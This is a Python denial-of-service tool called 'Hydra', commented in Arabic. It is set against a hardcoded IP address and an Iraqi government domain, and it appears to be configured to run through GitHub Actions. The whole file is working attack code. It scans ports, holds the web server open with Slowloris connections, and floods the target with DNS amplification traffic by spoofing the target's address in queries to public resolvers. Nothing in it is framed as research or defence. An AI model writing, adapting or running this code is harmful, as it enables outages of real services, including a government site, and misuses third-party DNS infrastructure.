import asyncio
import socket
import random
import time
import ssl
import aiodns
from scapy.all import IP, UDP, DNS, DNSQR, send

# --- الإعدادات الرئيسية ---
TARGET_IP = "63.246.154.12"  # سيتم استبداله بواسطة GitHub Actions
DURATION = 120               # سيتم استبداله بواسطة GitHub Actions
TARGET_DOMAIN = "moedu.gov.iq" # النطاق المستخدم في هجوم التضخيم

# --- إعدادات النواقل الهجومية ---
# ناقل Slowloris
SLOWLORIS_PORT = 80
SLOWLORIS_SOCKET_COUNT = 200
# ناقل تضخيم DNS
DNS_SERVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "149.112.112.112", "208.67.222.222", "208.67.220.220"
]

# --- الرسائل الملونة للطباعة ---
class Color:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'

def print_info(message):
    print(f"{Color.BLUE}[INFO] {message}{Color.RESET}")

def print_success(message):
    print(f"{Color.GREEN}[SUCCESS] {message}{Color.RESET}")

def print_error(message):
    print(f"{Color.RED}[!] خطأ: {message}{Color.RESET}")

# --- النواقل الهجومية ---

# 1. ناقل Slowloris (هجوم الطبقة السابعة)
async def slowloris_vector(target_ip, port):
    sockets = []
    print_info(f"تفعيل ناقل Slowloris على المنفذ {port} بـ {SLOWLORIS_SOCKET_COUNT} اتصال...")
    
    for _ in range(SLOWLORIS_SOCKET_COUNT):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            await asyncio.get_event_loop().sock_connect(s, (target_ip, port))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            s.send(f"Host: {TARGET_DOMAIN}\r\n".encode("utf-8"))
            s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36\r\n".encode("utf-8"))
            s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
            sockets.append(s)
        except (socket.error, OSError) as e:
            print_error(f"فشل إنشاء اتصال Slowloris: {e}")
            pass

    start_time = time.time()
    while time.time() - start_time < DURATION:
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
            except socket.error:
                sockets.remove(s)
        
        # إعادة إنشاء الاتصالات التي تم إغلاقها
        for _ in range(SLOWLORIS_SOCKET_COUNT - len(sockets)):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                await asyncio.get_event_loop().sock_connect(s, (target_ip, port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
                sockets.append(s)
            except (socket.error, OSError):
                pass
        await asyncio.sleep(10) # إرسال رؤوس للحفاظ على الاتصال كل 10 ثوانٍ

    for s in sockets:
        s.close()
    print_success("ناقل Slowloris أنهى عمله.")

# 2. ناقل تضخيم DNS (هجوم الطبقة الرابعة)
async def dns_amplification_vector(target_ip):
    print_info("تفعيل ناقل التضخيم: DNS Amplification...")
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            # --- الإصلاح النهائي: استخدام النطاق الصحيح ---
            # استخدام "moedu.gov.iq" كنطاق للاستعلام
            packet = IP(src=target_ip, dst=random.choice(DNS_SERVERS)) / \
                     UDP(sport=random.randint(1025, 65500), dport=53) / \
                     DNS(rd=1, qd=DNSQR(qname=TARGET_DOMAIN, qtype="TXT"))
            send(packet, verbose=0)
        except Exception as e:
            print_error(f"خطأ في ناقل التضخيم: {e}")
        await asyncio.sleep(0.01) # إرسال حزم بشكل سريع
    print_success("ناقل تضخيم DNS أنهى عمله.")

# --- الفاحص والمنسق الرئيسي ---
async def main():
    print("="*60)
    print("         Hydra - Asynchronous & Reflective Attack Core")
    print("="*60)
    print_info(f"الهدف: {TARGET_IP}")
    print_info(f"المدة: {DURATION} ثانية")

    print_info("بدء الفحص الأولي للمنافذ على الهدف...")
    open_ports = []
    common_ports = [80, 443]
    for port in common_ports:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET_IP, port), timeout=2.0
            )
            writer.close()
            await writer.wait_closed()
            print_success(f"المنفذ {port} ({'HTTP' if port == 80 else 'HTTPS'}) مفتوح.")
            open_ports.append(port)
        except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
            print_info(f"المنفذ {port} مغلق أو لا يستجيب.")
            pass

    if not open_ports:
        print_error("لم يتم العثور على أي منافذ مفتوحة. لا يمكن بدء هجوم الطبقة السابعة.")
        # سنستمر في هجوم الطبقة الرابعة بغض النظر
    
    tasks = []
    # إضافة هجوم الطبقة الرابعة (DNS) دائمًا
    tasks.append(dns_amplification_vector(TARGET_IP))

    # إضافة هجوم الطبقة السابعة (Slowloris) فقط إذا كان المنفذ 80 مفتوحًا
    if 80 in open_ports:
        tasks.append(slowloris_vector(TARGET_IP, 80))
    
    if not tasks:
        print_error("لا توجد نواقل هجومية متاحة للتفعيل. إنهاء البرنامج.")
        return

    print_success("تم تفعيل جميع النواقل الهجومية. Hydra يعمل الآن.")
    await asyncio.gather(*tasks)
    print_success("اكتملت جميع مهام Hydra.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print_info("\nتم إيقاف Hydra يدويًا.")
